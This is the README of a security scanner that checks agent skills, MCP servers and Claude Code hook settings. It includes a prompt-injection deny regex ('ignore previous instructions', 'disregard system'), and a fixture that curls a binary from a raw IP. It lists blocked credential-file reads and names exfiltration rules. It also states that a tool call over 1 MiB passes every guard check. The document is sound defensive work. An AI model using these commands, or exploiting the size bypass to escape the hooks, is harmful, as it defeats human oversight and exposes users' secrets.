# spellwarden

The Spellwarden scan engine: the baseline rules for agent skills and MCP servers, the probe classification against the 2026-07-28 MCP specification, the migration checklist and the curation score. It is the engine of the hosted product at [spellwarden.ai](https://spellwarden.ai) and is published so that the same rules run in your own tooling.

One distribution holds two import packages. `spellwarden_scan` is the engine and is pure code: it never opens a connection, reads a file or an environment variable; you hand it the bytes of a package, a configuration file or the recorded result of a probe, and it hands back findings. `spellwarden_cli` is the `spellwarden` command: it finds the agent content in a repository, runs the engine on it on your machine or CI runner, and writes the reports. The GitHub Action and the GitLab CI component that run the command in pipelines arrive with 1.0.0.

```
pipx run spellwarden scan .          # or: pip install spellwarden, then spellwarden scan .
```

Python 3.11 or newer. The only dependency is PyYAML.

## Scanning a skill package

```python
from spellwarden_scan import RuleSet, scan_skill_package, unpack_zip

files, executable = unpack_zip(open_bytes, with_modes=True)   # or any {path: bytes} mapping you built yourself
result = scan_skill_package(files, RuleSet.baseline(), executable_paths=executable)
for finding in result.findings:
    print(finding.rule_id, finding.severity, finding.location.path, finding.location.line, finding.evidence)
print(result.sha256, result.metadata.name, result.truncated)
```

- `files` maps POSIX relative paths to bytes. `root` names the directory that holds `SKILL.md` when it is not the package root.
- `unpack_zip(data, limits=ArchiveLimits(), with_modes=False)` reads a zip held in memory and refuses unsafe archives with an `ArchiveError` whose `code` is one of `too_large`, `too_many_files`, `unsafe_path`, `symlink`, `bad_zip`, `empty`. The default limits are 20 MiB compressed, 50 MiB uncompressed, 2000 files, 10 MiB per file.
- `result.sha256` is the canonical hash of the package: SHA-256 over `path NUL content NUL` for every path in sorted order, stable across archive layout.
- `result.metadata` holds `name`, `description`, `version`, `license`, `publisher` from the frontmatter (nested `metadata:` keys and `author` are read too), which of them are present, and the problems that rule SW-SKL-015 reports.
- `max_findings` (500) and `max_per_rule` (100) bound what the scan keeps; rules run worst severity first and `result.truncated` counts the matches that were not kept.
- Evidence is at most 300 characters and credential-shaped text in it is masked. `fingerprint` is the SHA-256 of rule id, path and matched text, so a finding keeps its identity across scans.

## Evaluating an MCP server probe

```python
from spellwarden_scan import ProbeResult, RuleSet, evaluate_probe

probe = ProbeResult.from_dict(recorded)      # what your prober recorded; every field has a default
result = evaluate_probe(probe, RuleSet.baseline())
print(result.transport, result.auth_mode, result.spec_version, result.migration_status)
for item in result.checklist:
    print(item.order, item.text)
```

`ProbeResult` is the record of an unauthenticated probe: the `server/discover` or `initialize` result, the status and content type of the POST and GET, whether a session header was seen, the `tools/list` answer, the RFC 9728 protected resource metadata and the authorization server metadata. The classification follows one rule set:

- transport: `streamable-http`, `sse`, `stdio` (a repository without an endpoint) or `unknown`;
- authentication: `none`, `static-key`, `oauth-dcr`, `oauth-cimd`, `xaa` or `unknown`;
- spec version: the highest `supportedVersions` date of `server/discover`, else the negotiated `initialize` version;
- deprecated features, in a fixed order: `sse`, `initialize_only`, `sessions`, `roots`, `sampling`, `logging`, `dcr`;
- `migration_status`: `ready` when the spec version is 2026-07-28 or later, authentication is CIMD or XAA and nothing deprecated is in use; `to_migrate` otherwise; `not_probeable` for stdio servers.

The checklist has twelve items in a fixed order, each present only when it applies (move to streamable HTTP; add `server/discover`; remove sessions; carry the protocol version and capabilities in `_meta`; replace `sampling/createMessage` with an `input_required` result; replace Logging with a per-request `_meta` log level; move long jobs to the Tasks extension; register a Client ID Metadata Document and enable OAuth with RFC 9728 and RFC 8707; validate `iss`; set `ttlMs` and `cacheScope` on list results; propagate `traceparent`; re-run the scan, which is always last).

## Curation score

```python
from spellwarden_scan import CurationInputs, curation_score, is_curated, is_quarantined

inputs = CurationInputs(open_findings=open_ones, accepted_findings=accepted_ones, metadata_present=5, eval_component=0.5)
score = curation_score(inputs)          # 0 to 12, one decimal
curated = is_curated(inputs, score)     # score >= 8, no open critical or high finding, hash unchanged, not quarantined
quarantined = is_quarantined(open_ones) # any open finding from a malicious-indicator rule
```

The score is `12 x (0.6 S + 0.2 M + 0.2 E)`: `S = max(0, 1 - (6 critical + 3 high + 1 medium + 0.25 low) / 12)` over open findings with accepted findings at half weight, `M` the share of the five metadata fields present, `E` an evaluation component that is 0.5 until evaluations exist.

## The rules

Ids are `SW-SKL-NNN` (skill packages), `SW-MCP-NNN` (probed MCP servers) and `SW-CFG-NNN` (agent configuration files: MCP client configurations, Claude Code settings and hooks, plugin marketplaces). Mappings use the OWASP Agentic Top 10 (ASI) and OWASP MCP Top 10 (MCP) identifiers and NIST SP 800-53 base controls, labelled as a provisional mapping to SP 800-53 base controls. Four rules are malicious indicators: an open finding from one of them quarantines the package.

<!-- rules:start -->
| Id | Title | Severity | OWASP | NIST |
|---|---|---|---|---|
| SW-SKL-001 | Prompt-injection phrases in skill instructions | high | ASI01 | SI-10 |
| SW-SKL-002 | Hidden text: zero-width or bidirectional control characters | high | ASI01 | SI-10 |
| SW-SKL-003 | Instructions to skip approvals or disable hooks | high | ASI10 | AC-6 |
| SW-SKL-004 | Encoded payload decoded and executed (malicious indicator) | critical | ASI04 | SR-3 |
| SW-SKL-005 | Writes to agent configuration | high | ASI10 | AC-6 |
| SW-SKL-006 | Destructive command without a confirmation step | medium | ASI10 | AC-6 |
| SW-SKL-007 | Remote script piped to a shell | high | ASI04 | SR-3 |
| SW-SKL-008 | Sends local file contents to an external host (malicious indicator) | critical | ASI10 | SC-7 |
| SW-SKL-009 | Unpinned dependency install | medium | ASI04 | SR-3 |
| SW-SKL-010 | Bundled binary or executable file | medium | ASI04 | SR-3 |
| SW-SKL-011 | Hard-coded credential in the package | critical | MCP01 | IA-5 |
| SW-SKL-012 | Reads a credential file path without stating purpose | medium | ASI04 | IA-5 |
| SW-SKL-013 | Network calls to raw IP addresses or URL shorteners | medium | ASI10 | SC-7 |
| SW-SKL-014 | Obfuscated script code | medium | ASI04 | SR-3 |
| SW-SKL-015 | Frontmatter missing or invalid (name, description) | low | ASI04 | SR-3 |
| SW-SKL-019 | Fetches external URL content into context without an allowlist | medium | ASI01, MCP10 | SI-10 |
| SW-SKL-031 | Missing license and version metadata | low | ASI04 | SR-3 |
| SW-MCP-001 | Server lists tools without authentication | high | MCP01 | AC-3 |
| SW-MCP-002 | Static key authentication instead of OAuth | medium | MCP01 | IA-5 |
| SW-MCP-003 | OAuth dynamic client registration (deprecated; use Client ID Metadata Documents) | medium | MCP01 | IA-5 |
| SW-MCP-004 | HTTP+SSE transport (deprecated) | medium | ASI04 | SR-3 |
| SW-MCP-005 | Spec version older than 2026-07-28 | low | ASI04 | SR-3 |
| SW-MCP-006 | Protocol sessions (Mcp-Session-Id) in use | medium | ASI04 | SR-3 |
| SW-MCP-007 | Requires the initialize handshake; no server/discover | medium | ASI04 | SR-3 |
| SW-MCP-008 | Uses deprecated Roots, Sampling or Logging | medium | ASI04 | SR-3 |
| SW-MCP-009 | Endpoint not served over HTTPS | high | MCP01 | SC-7 |
| SW-MCP-010 | No protected resource metadata, or issuer not validated | medium | MCP01 | IA-5 |
| SW-MCP-011 | Tool description contains instruction-like text | high | ASI01, MCP10 | SI-10 |
| SW-CFG-001 | Remote MCP server over plain HTTP | high | MCP01 | SC-7 |
| SW-CFG-002 | Credential written into an MCP server configuration | critical | MCP01 | IA-5 |
| SW-CFG-003 | MCP server launched from an unpinned package | medium | ASI04 | SR-3 |
| SW-CFG-004 | MCP server at a raw IP address or behind a URL shortener | medium | ASI10 | SC-7 |
| SW-CFG-005 | Hook pipes remote content to a shell | high | ASI04 | SR-3 |
| SW-CFG-006 | Hook sends local file contents to an external host (malicious indicator) | critical | ASI10 | SC-7 |
| SW-CFG-007 | Hook decodes and runs an encoded payload (malicious indicator) | critical | ASI04 | SR-3 |
| SW-CFG-008 | Settings switch off approval prompts | high | ASI10 | AC-6 |
| SW-CFG-009 | Marketplace plugin source not pinned to a commit | medium | ASI04 | SR-3 |
| SW-CFG-010 | Literal value under a secret name in an MCP server configuration | high | MCP01 | IA-5 |
<!-- rules:end -->

Ids 016 to 018 and 020 to 030 are reserved. `RuleSet.baseline()` returns these rules; `ruleset.with_rules(extra)` adds your own `Rule` objects built with `spellwarden_scan.rules.make_rule`.

## Org rules, packs and exports

Since 1.1.0 the engine also holds what the hosted product calls Ward: rules an organisation writes as data (org rules), policy packs, and the exports that turn a pack into enforcement for Claude Code hooks and Kong. All of it is pure, like the rest of the engine. The `spellwarden` command does not load org rules or packs yet; it scans with the baseline rules only.

### Org rules

An org rule is a JSON object that `validate_org_rule(spec)` checks and `compile_org_rule(spec)` turns into a `Rule` that `RuleSet.with_rules` accepts. A refused spec raises `OrgRuleError` with a `code` (`bad_id`, `bad_title`, `bad_severity`, `bad_area`, `bad_mapping`, `bad_target`, `bad_detection`, `bad_glob`, `pattern_too_long`, `pattern_syntax`, `pattern_too_complex`, `bad_predicate`, `bad_values`, `unknown_key`) and a one-sentence `message` that names the position of a pattern error.

- `id` is `SW-ORG-001` to `SW-ORG-999`; `title` 1 to 120 characters on one line; `severity` `critical`, `high`, `medium` or `low`; `owasp` and `nist` at most five identifiers each from the lists the baseline rules use; `malicious` (only with `critical`) makes a finding quarantine the package, as the baseline's malicious indicators do; unknown keys are refused.
- `area` `skill` takes a pattern detection: `{"kind": "pattern", "files": "**/*.sh", "in": "commands", "pattern": "...", "case_sensitive": false}`. `files` is a path glob inside the skill (`*`, `?` and `[...]` within one folder, `**` for any number of folders; default `**`). `in` is `lines` (every line of every selected text file, the default) or `commands` (every shell command of the selected scripts and of the fenced code blocks of the selected Markdown files, with `\`, `|`, `&&` and `||` continuations joined, which is what a Claude Code hook sees as a Bash command). One finding per matching line or command.
- `area` `mcp` takes one of eight server checks: `{"kind": "probe", "predicate": "auth_mode_in", "values": ["none", "static-key"]}`. The predicates are `auth_mode_in`, `transport_in`, `deprecated_feature_any`, `spec_version_below` (also true when the version is unknown), `endpoint_host_in` and `endpoint_host_not_in` (lower-case host names, or `*.example.com` for every subdomain, which does not match `example.com` itself), and `tool_name_matches` and `tool_description_matches`, which take a `pattern` and give one finding per tool at `tool:<name>`. A stdio server has no endpoint and is judged by `transport_in` and the two tool checks only.
- `targets` names the exports that enforce the rule: `claude-code-hooks` (a pattern rule with `"in": "commands"`) and `kong` (any pattern rule). A server check has no target.

Patterns use a small subset of regular expressions that the engine reads in bounded time and that Kong reads the same way:

| Construct | Allowed |
|---|---|
| Literal characters | Any character except `\ . [ ] ( ) \| * + ? { } ^ $`, which are written escaped (`\.`, `\(`). `\/` and `\-` are accepted escapes. |
| Classes | `.`, `\s \S \d \D \w \W`, bracket classes `[...]` and `[^...]` with literal members, escapes and ranges such as `a-z`; no nested `[`, no `[:name:]`. |
| `\b` | A word boundary; it cannot be quantified. |
| Anchors | `^` only as the first character of the pattern, `$` only as the last. |
| Quantifiers | `?`, `*`, `+`, `{m}` and `{m,n}`, each on exactly one character, escape, `.` or bracket class. No lazy or possessive forms, no `{m,}`. |
| Groups | `(a\|b\|c)`: alternatives made of characters and classes with at most `?`, `{m}` or `{m,n}`; a group may be followed by `?`; groups do not nest and never capture. |
| Gaps | A `.*` outside a group splits the pattern into parts, matched one after the other. |
| Per part | At most one `*` or `+` besides the gaps. |
| Start of a part | A part may not start with `*` or `+`, also after optional items (`a?\s+x` is refused). |
| Next to a repeat | A repeat whose count varies (`?`, `*`, `+`, `{m,n}` with `m` below `n`) may not sit next to an item that can match the same character, in any path through the part (groups and optional items included, `\b` ignored): `a+a`, `\s*\s`, `x.{0,100}y` and `x[a-z]+[a-c]` are refused, `x\s+y` is accepted. |
| Not allowed | Backreferences, lookahead and lookbehind, inline flags, named groups, `\A \Z \G`, `\x \u \N` and octal escapes, a `\|` outside a group, a quantified group other than `?`, nested groups. |

A pattern that breaks one of the rules above is `pattern_syntax`; one that is well formed but exceeds a limit below, or breaks the start-of-part or next-to-a-repeat rule (which keep the matching time bounded), is `pattern_too_complex`.

The limits, which `spellwarden_scan.PATTERN_LIMITS` holds:

<!-- pattern-limits:start -->
| Limit | Value | What it bounds |
|---|---|---|
| `max_length` | 300 | Characters in a pattern |
| `max_parts` | 4 | Parts between the `.*` gaps |
| `max_groups` | 4 | Groups in one part |
| `max_alternatives` | 16 | Alternatives in one group |
| `max_class_members` | 64 | Members of one bracket class |
| `max_repeat` | 100 | The largest number in `{m}` and `{m,n}` |
| `max_repeat_range` | 400 | How much the repeats of one part may vary in all: `n` minus `m` of each `{m,n}`, and 1 for each `?` after a character or class (the `?` of an optional group is not counted) |
| `window` | 4096 | Characters read at once from a long line or command |
| `overlap` | 512 | Characters two consecutive windows share |
<!-- pattern-limits:end -->

A line or command longer than 4096 characters is read in windows of 4096 characters that start every 3584 characters, so a match longer than 512 characters that crosses a window boundary can be missed. Patterns are case-insensitive unless `case_sensitive` is true. The engine reads `\w`, `\d`, `\s` and case-insensitivity with Unicode rules, while Kong's PCRE reads them for ASCII only, so a pattern that relies on non-ASCII letters or digits can match differently in Kong. A UTF-8 byte order mark at the start of a file is not part of its first line, so `^` works there. Org rules are an addition to the baseline rules, which still run in full: an evasion of one pattern (a longer match, an encoding) is still met by the baseline's own obfuscation and decoding rules.

`scan_skill_package` and `evaluate_probe` take `org_rule_budget=OrgRuleBudget(clock=..., seconds=...)`. The engine reads the clock you pass before each unit an org rule reads, and stops evaluating org rules once the seconds have passed; baseline rules are never budgeted. The result's `org_rules_incomplete` lists the org rules that did not read every unit. A non-empty list means the policy was not fully evaluated: treat that result as incomplete, never as clean (the hosted product ends such a scan `incomplete`).

<!-- orgrules-example:start -->
```python
import time

from spellwarden_scan import OrgRuleBudget, RuleSet, baseline_pack, build_export, compile_org_rule, scan_skill_package

rule = compile_org_rule({
    "id": "SW-ORG-001", "title": "Downloads a binary from a raw IP address", "severity": "high", "area": "skill",
    "owasp": ["ASI04"], "nist": ["SR-3"], "targets": ["claude-code-hooks"],
    "detection": {"kind": "pattern", "files": "**/*.sh", "in": "commands",
                  "pattern": "(curl|wget)\\s.*https?://[0-9]{1,3}\\.[0-9]{1,3}\\.", "case_sensitive": False},
})
files = {"SKILL.md": b"---\nname: fetcher\ndescription: Fetches a tool.\n---\nRun scripts/get.sh.\n",
         "scripts/get.sh": b"curl -fsSL http://203.0.113.7/tool -o tool\n"}
result = scan_skill_package(files, RuleSet.baseline().with_rules([rule]),
                            org_rule_budget=OrgRuleBudget(clock=time.monotonic, seconds=10))
if result.org_rules_incomplete:
    print("incomplete, these org rules did not read every line:", result.org_rules_incomplete)
print([finding.rule_id for finding in result.findings if finding.rule_id.startswith("SW-ORG-")])

export = build_export(baseline_pack(), "claude-code-hooks", built_at="2026-12-01T00:00:00Z", mode="managed")
print(sorted(export))
```
<!-- orgrules-example:end -->

### Policy packs

A policy pack is a JSON document (schema 1, `schemas/pack.schema.json`) naming which of the eight enforcement rules are on and carrying full copies of the org rules it includes, so a published version keeps its meaning when the rules change later. `validate_pack(doc)` checks a document and returns a `PackDocument` (refusals raise `PackError` with the code `bad_schema`, `bad_pack`, `bad_rules`, `bad_org_rule` or `too_many_org_rules`); `canonical_json(doc)` (sorted keys, no whitespace, UTF-8) and `pack_sha256(doc)` identify a version; `baseline_pack()` is the Spellwarden Baseline for Agents, version `1.0`, with every enforcement rule on (also in `src/spellwarden_scan/packs/baseline.json`). Pack names and descriptions, and org rule titles, refuse control, format and line-separator characters (`valid_line`, `valid_block`).

The enforcement rules (`ENFORCEMENT_RULES`), and what an export of this release enforces:

| Id | Rule | Enforced by (1.1.0) |
|---|---|---|
| `SW-HK-001` | Block remote scripts piped to a shell in agent shell tools | Claude Code hooks |
| `SW-HK-002` | Block reads of credential files (`~/.aws`, `~/.ssh`, `.env`) | Claude Code hooks |
| `SW-GW-003` | Deny MCP upstreams without OAuth | Not enforced by an export in this version (needs Kong's MCP plugins) |
| `SW-GW-004` | Prompt-injection deny patterns on prompts and tool results | Kong, prompts only |
| `SW-EG-005` | Sandbox egress only to registry-admitted hosts | Not enforced by an export in this version |
| `SW-GW-006` | Destructive tool verbs require human approval | Claude Code hooks (asks for approval) |
| `SW-RG-007` | Registry admits only curated, auth-enabled entries on spec 2026-07-28 with no open critical or high finding | The hosted private registry's admission policy, not an export |
| `SW-OB-008` | Emit an audit record for every tool call | Not enforced: the Claude Code export writes a local activity log, which is not an audit trail |

"Enforced" means enforced where the export is deployed in a way the developer cannot change: for Claude Code that is the managed mode below.

### Exports

`build_export(pack, target, built_at=..., mode=...)` returns the files of an export as `{path: bytes}`; `target` is one of `EXPORT_TARGETS` (`claude-code-hooks`, `kong`), and `PLANNED_TARGETS` (`zuplo`, `agentcore-policy`, `cloudflare-egress`) are not available yet. Every export holds `SPELLWARDEN-README.md`, which lists what the target enforces, what it cannot enforce and why, how to install it and the limits of its mode, and ends with: Validate field names against the vendor's current documentation before use.

**Claude Code hooks.** One guard script, `spellwarden_guard.py` (Python 3.8 or newer, standard library only, the pack's checks compiled in, never opening the network), run by a `PreToolUse` hook for Bash, PowerShell (Claude Code's shell tool on Windows), Read, Grep, Glob and MCP tools, and by a `PostToolUse` hook when SW-OB-008 is on. It denies piped remote scripts and credential-file reads, asks before destructive commands and destructive MCP tool verbs, and applies org rules with the `claude-code-hooks` target (deny for critical or high, ask for medium or low); when one command matches both, the deny wins. The command patterns are written for POSIX shells and read PowerShell commands as text. Windows paths are checked as given and with `\` read as `/`. On unreadable input, including an event larger than 1 MiB, it prints nothing and exits 0: the guard never blocks on its own failure, and a missing interpreter or a timeout lets the tool call proceed. An agent can therefore pass every check by making one tool call larger than 1 MiB. A missing or unreadable script is different: Python exits with status 2, which Claude Code reads as a block, so every matched tool call is refused until the script is restored. Every hook runs it as `python3 -I`, so the checkout cannot plant a module it imports. `SHA256SUMS` lists the script's SHA-256.

- Project mode (`mode="project"`, advisory): `.claude/settings.json` with the hooks, `.claude/hooks/spellwarden_guard.py`, `.claude/.gitignore` (the activity log), `SHA256SUMS` and `SPELLWARDEN-README.md`, for committing to the repository. The repository controls these files: any branch can change, replace or remove the script or the settings, so this mode helps developers who want it and enforces nothing against a checkout that does not.
- Managed mode (`mode="managed"`, enforceable): `managed/linux/managed-settings.json`, `managed/macos/managed-settings.json`, `managed/windows/managed-settings.json`, `managed/spellwarden_guard.py`, `SHA256SUMS` and `SPELLWARDEN-README.md`. Administrators install the script read-only, owned by root or the Administrators group, at an absolute path outside every checkout, verify it against `SHA256SUMS`, and place the platform's settings file where Claude Code reads managed settings; each settings file sets `allowManagedHooksOnly`, so user, project and plugin hooks are ignored. Where a `managed-settings.json` already holds the organisation's policy, add this file's keys to it or place it as `managed-settings.d/50-spellwarden.json` beside it, rather than replacing it. On WSL, `/etc/claude-code` can be written by the user, so the managed mode is not enforced there.

| Platform | Script path | Managed settings file | Status |
|---|---|---|---|
| Linux | `/etc/claude-code/spellwarden/spellwarden_guard.py` | `/etc/claude-code/managed-settings.json` | verified on 21 October 2026 |
| macOS | `/Library/Application Support/ClaudeCode/spellwarden/spellwarden_guard.py` | `/Library/Application Support/ClaudeCode/managed-settings.json` | verified on 21 October 2026 |
| Windows | `C:\Program Files\ClaudeCode\spellwarden\spellwarden_guard.py` | `C:\Program Files\ClaudeCode\managed-settings.json` | verified on 21 October 2026 |

The baseline pack's project mode writes this `.claude/settings.json`:

<!-- hooks-project-example:start -->
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^(Bash|PowerShell|Read|Grep|Glob|mcp__.*)$",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/spellwarden_guard.py pre",
            "timeout": 10
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/spellwarden_guard.py post",
            "timeout": 10
          }
        ]
      }
    ]
  }
}
```
<!-- hooks-project-example:end -->

and its managed mode this `managed/linux/managed-settings.json` (macOS and Windows differ only in the script path):

<!-- hooks-managed-example:start -->
```json
{
  "allowManagedHooksOnly": true,
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^(Bash|PowerShell|Read|Grep|Glob|mcp__.*)$",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"/etc/claude-code/spellwarden/spellwarden_guard.py\" pre",
            "timeout": 10
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"/etc/claude-code/spellwarden/spellwarden_guard.py\" post",
            "timeout": 10
          }
        ]
      }
    ]
  }
}
```
<!-- hooks-managed-example:end -->

A platform is verified once the CI job `managed-guard` and a check by hand with Claude Code have passed on it; the same list (`spellwarden_scan.exports.hooks.MANAGED_VERIFIED`) decides which platforms every managed export's README names as not verified yet. The hook commands quote the path, for example `python3 -I "/Library/Application Support/ClaudeCode/spellwarden/spellwarden_guard.py" pre`, and on Windows `py -3 -I "C:\Program Files\ClaudeCode\spellwarden\spellwarden_guard.py" pre`, which reads the same in Git Bash and in PowerShell, the shells Claude Code runs hook commands with on Windows (`sh -c` on Linux and macOS). The export does not set the hook field `onFailure`: the guard never blocks on its own failure, and an administrator who wants failures to block can set `"onFailure": "block"` where their Claude Code version offers it. With SW-OB-008 on, the guard appends one line per tool call (time, session id, tool name; never the tool's input or output) to `spellwarden-activity.jsonl` in the project's `.claude/` (project mode) or the user's `~/.claude/` (managed mode), refusing links and anything that is not a regular file, with mode 0600, rotated to `.1` at 5 MiB. It is a local activity log the user can read, change or delete, not an audit trail.

**Kong.** `kong/spellwarden-<pack id>-<version>.yaml` (for the baseline, `kong/spellwarden-baseline-1.0.yaml`) and `SPELLWARDEN-README.md`: a decK file with one global `ai-prompt-guard` plugin whose `deny_patterns` are the engine's prompt-injection patterns (SW-GW-004, prompts only) and the org rules with the `kong` target, each pattern a scoped group (`(?i:...)` for the injection patterns, `(?im:...)` for an org rule, `(?m:...)` when it is case-sensitive) joined with `|` into at most 10 entries of at most 500 characters. Org patterns are read line by line, as the engine reads a unit: a single part is exported as `(?im:A)`, so `^` and `$` hold at the ends of each line, and a pattern with several parts as `(?im:^(?>.*?A)(?>.*?B))`: per line, the first A and then the first B after it, with atomic groups so that a long prompt cannot make the gateway backtrack. Scope the plugin to your AI routes or services by adding `route:` or `service:`, then add it to your decK state, for example with `deck file merge`. Do not run `deck gateway sync` with this file alone: it removes every entity that is not in the files it is given. Run `deck gateway diff`, check the changes, then `deck gateway sync`. The baseline pack's export begins:

<!-- kong-example:start -->
```yaml
# Spellwarden policy export: pack "Spellwarden Baseline for Agents" 1.0, built 2026-12-01T00:00:00Z.
# Enforced here: SW-GW-004 (prompts only).
# Not enforced by this target: SW-HK-001 (enforced by the Claude Code hooks export), SW-HK-002 (enforced by the Claude Code hooks export), SW-GW-003 (needs Kong's MCP plugins), SW-EG-005 (a sandbox egress proxy is not in this version), SW-GW-006 (enforced by the Claude Code hooks export), SW-RG-007 (enforced by the private registry, not by an export), SW-OB-008 (a protected audit trail of tool calls is not in this version).
# Validate field names against the vendor's current documentation before use.
_format_version: '3.0'
plugins:
- name: ai-prompt-guard
  config:
    deny_patterns:
```
<!-- kong-example:end -->

followed by one entry that joins the nine prompt-injection patterns, `(?i:ignore (all |any |the |your )?(previous|prior|above|earlier) (instructions|prompts|rules))|(?i:disregard (the |your )?(system|previous|prior))|...`.

## The `spellwarden` command

```
spellwarden scan [PATH] [--format FMT [--output FILE]]... [--fail-on LEVEL] [--locked] [--probe | --no-probe]
                 [--probe-private | --no-probe-private] [--baseline FILE] [--config FILE] [--as-of YYYY-MM-DD]
                 [--no-telemetry] [--quiet] [--verbose]
spellwarden lock [PATH] [--check]
spellwarden baseline add [PATH] (--fingerprint FP... | --all) --reason TEXT [--expires YYYY-MM-DD | --days N]
spellwarden baseline prune [PATH]
spellwarden baseline list [PATH]
spellwarden rules [--format text|json|markdown]
spellwarden ci comment --provider github|gitlab --body FILE
spellwarden ci-run gitlab
spellwarden version
```

`python -m spellwarden_cli` is the same command; the CI wrappers use that form.

### What a scan reads

`PATH` (default `.`) is the scan root. Inside a git work tree the file set is what git tracks plus untracked files that are not ignored, under the scan root only (submodules are not entered); elsewhere it is a walk that skips `.git`, `node_modules`, `.venv`, `venv` and `__pycache__`. A symbolic link is never read as a file: one at an agent-content path (a configuration file, `SKILL.md`, a plugin manifest or hooks file, a manifest reference) is followed when its target is a regular file of the file set inside the scan root, and named by the link in every output. The target is judged from its text alone, never by asking the file system where it leads: an absolute target (`/x`, `C:\x`, `\\host\share\x`) is the error `unsafe_path` (use a relative link or a real file), and a relative one is resolved against the scan root as written. One that leaves the scan root, passes through a linked directory or points at another link is the error `unsafe_path`; a link inside a skill or a local plugin directory is followed by the same rules, and one whose relative target leaves the scan root is skipped with a notice while its target text is locked, unless it names a directory above the scan root or might lead back into it under another spelling (another case, a trailing dot, a Windows short name such as `REPO~1`), which is `unsafe_path`; any other link is skipped with a notice. Files over 10 MiB are skipped with a notice. Configuration and marketplace file names match whatever their case (`.MCP.json`), as macOS and Windows open them. A link target, a manifest reference and a plugin's own `.mcp.json`, `hooks/hooks.json` and `.claude-plugin/plugin.json` must name a file exactly as the file set holds it: one that matches a file or directory only in another case or Unicode form is `unsafe_path`, because on Linux the other spelling is another file. A skill is a directory holding exactly `SKILL.md`; another spelling (`skill.md`) gets the notice `skill_name_case`, and is judged as the skill's `SKILL.md` only under a `skills/` directory, where agents on macOS and Windows load it. `include` and `exclude` in the settings narrow the set further.

In that set the scanner finds:

| Item | Where | Judged by |
|---|---|---|
| Skill | every directory holding a `SKILL.md`, with every file below it (a nested `SKILL.md` starts its own skill) | the `SW-SKL` rules |
| MCP client configuration | `.mcp.json`, `.vscode/mcp.json`, `.cursor/mcp.json`; each server in it is an item of its own | `SW-CFG-001` to `004`, `010`; `SW-MCP` rules under `--probe` |
| Claude Code settings | `.claude/settings.json`, `.claude/settings.local.json` (with their hooks) | `SW-CFG-005` to `008` |
| Plugin marketplace | `.claude-plugin/marketplace.json` and every plugin it lists (a local source `./` is the marketplace's own directory) | `SW-CFG-009`; a local plugin's skills, `.mcp.json`, `hooks/hooks.json` and `.claude-plugin/plugin.json` are scanned like the files above |

A plugin hosted elsewhere (a GitHub repository or a URL) is listed and locked by its declared source, never fetched. Configuration files are read as JSON with comments and trailing commas (VS Code's `mcp.json` dialect). A file with a key repeated in one object is refused (`duplicate_key`): agents disagree on which copy wins, so the scanner will not guess. Everything read from the repository is treated as hostile: sizes and nesting are bounded, paths are confined to the scan root, and every string is escaped for the place it is printed.

### Exit codes

| Code | Meaning |
|---|---|
| 0 | Passed: no unsuppressed finding at or above `--fail-on` (default `high`; `never` always passes on findings). |
| 1 | Failed on findings. |
| 2 | Incomplete or invalid: a usage or settings error, an unreadable file, a configuration document the scanner refused or cut short (over 200 servers, 500 hooks or 200 plugins), a skill over 2000 files or 50 MiB, an invalid baseline entry, or a scanner crash. |
| 3 | `--locked` and the lock file is absent or out of date. |

When several apply, 2 wins over 1, and 1 over 3: an incomplete scan never looks like a pass. Every requested report is written before the exit.

### Settings: `.spellwarden/config.yml`

```yaml
version: 1
include: []                 # globs; empty means every file of the file set
exclude: ["tests/fixtures/**"]
fail-on: high
probe: false
telemetry: true
```

The file is optional. An unknown key or a `version` other than 1 is an error (exit 2), so a typo never silently weakens a gate. A flag wins over the environment (`SPELLWARDEN_FAIL_ON`, `SPELLWARDEN_PROBE`, `SPELLWARDEN_TELEMETRY`), which wins over the file. Private probing is deliberately not a setting (see "Probing MCP servers").

**On a pull or merge request, this file and the baseline are read from the base revision**, the commit the request targets, never from the request itself. Otherwise a request could add a malicious `.mcp.json` together with `exclude: [".mcp.json"]`, or accept its own finding in the baseline, and pass its own check. A request that changes either file therefore sees the change apply only once it is merged, and the report says so with the notice `settings_from_base`. The lock file is still read from the request: a request that changes agent content must update it, and reviewers see that change. Under `--locked` the lock is computed with the base's `include` and `exclude`, so a request that changes those patterns and the lock together is reported stale until the settings change is merged first. Local runs, pushes, schedules and manual runs read the working tree as before. A `--config` or `--baseline` file named on the command line is read as given: whoever runs the scanner chose it.

The scanner reads the base revision with git. A shallow clone that lacks it is fetched once from `origin` (that one commit, depth 1, no tags, hooks off). When the base still cannot be read (the event names no base commit, git is missing, or the fetch failed) the scan uses the default settings and no baseline, and the notice `base_unavailable` says why. On GitHub, check out with `actions/checkout` `fetch-depth: 0`, or keep its default `persist-credentials: true` so the fetch can authenticate. On GitLab, set `GIT_DEPTH: 0` (or a depth that reaches the merge base) in the job, because the scanner image cannot write to a clone it does not own.

### The lock file: `.spellwarden/lock.json`

`spellwarden lock` records every discovered configuration file, MCP server, plugin source, local plugin directory and skill with a hash. `spellwarden scan --locked` (and `spellwarden lock --check`) exits 3 when anything was added, removed or changed since, and names each item, so a change to agent content is a visible, reviewed change. The lock holds no scanner version: upgrading the scanner never makes it stale. A skill's hash is computed over paths relative to the skill's directory, so moving a skill changes only its path.

### The baseline file: `.spellwarden/baseline.yml`

```yaml
version: 1
accepted:
  - fingerprint: 9c1d...            # 64 hex characters, from the report
    rule: SW-SKL-009
    path: .claude/skills/deploy/scripts/setup.sh
    reason: Installed from our internal mirror, which pins versions.
    added: 2026-12-01
    expires: 2027-01-31
```

An entry accepts one finding, by fingerprint, from `added` to `expires`. It needs a reason, may last at most 365 days, and at most 30 days for a malicious-indicator rule (SW-SKL-004, SW-SKL-008, SW-CFG-006, SW-CFG-007). An invalid entry accepts nothing and fails the scan (exit 2); an expired one stops accepting, and the report says which entry expired on which date. Accepted findings stay in every report, marked as accepted with their reason. `spellwarden baseline add --all --reason "..."` accepts every current finding (90 days by default), `prune` removes entries that no longer match anything, `list` shows each entry's state. These three commands work on the files in your working tree.

